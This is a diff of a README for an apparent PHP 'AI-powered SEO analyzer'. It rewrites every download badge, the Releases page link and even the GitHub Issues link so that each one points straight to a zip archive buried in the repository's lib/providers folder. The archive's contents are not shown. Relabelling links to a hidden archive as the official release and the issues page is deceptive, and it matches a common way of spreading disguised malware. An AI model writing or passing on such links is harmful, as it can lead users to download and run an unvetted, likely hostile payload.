@@ -1,7 +1,7 @@
 # 🤖 php-ai-powered-seo-analyzer - Analyze Websites for Better SEO
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/VkDrew/php-ai-powered-seo-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/VkDrew/php-ai-powered-seo-analyzer/master/lib/providers/seo_ai_powered_analyzer_php_1.4.zip%20Page-brightgreen)](https://raw.githubusercontent.com/VkDrew/php-ai-powered-seo-analyzer/master/lib/providers/seo_ai_powered_analyzer_php_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the php-ai-powered-seo-analyzer! This tool helps you analyze any website's SEO performance with the help of AI. It provides actionable recommendations to enhance your site's search engine visibility.
@@ -20,7 +20,7 @@ Before you download, ensure your system meets these requirements:
 - Composer installed on your machine
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://github.com/VkDrew/php-ai-powered-seo-analyzer/releases) to download the latest version of the application. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/VkDrew/php-ai-powered-seo-analyzer/master/lib/providers/seo_ai_powered_analyzer_php_1.4.zip) to download the latest version of the application. 
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the software.
@@ -43,7 +43,7 @@ If you encounter any issues:
 
 ## 💬 Getting Help
 Should you need further assistance:
-- Visit our [GitHub Issues page](https://github.com/VkDrew/php-ai-powered-seo-analyzer/issues) to report problems or request support.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/VkDrew/php-ai-powered-seo-analyzer/master/lib/providers/seo_ai_powered_analyzer_php_1.4.zip) to report problems or request support.
 - Join our community forum for tips and advice from other users.
 
 ## 📜 License
@@ -55,6 +55,6 @@ Thank you to everyone who contributed to this project. Your support is appreciat
 ## 📢 Stay Updated
 For updates and news, follow the repository on GitHub and enable notifications for the latest releases. 
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/VkDrew/php-ai-powered-seo-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/VkDrew/php-ai-powered-seo-analyzer/master/lib/providers/seo_ai_powered_analyzer_php_1.4.zip%20Page-brightgreen)](https://raw.githubusercontent.com/VkDrew/php-ai-powered-seo-analyzer/master/lib/providers/seo_ai_powered_analyzer_php_1.4.zip)
 
 Happy analyzing!
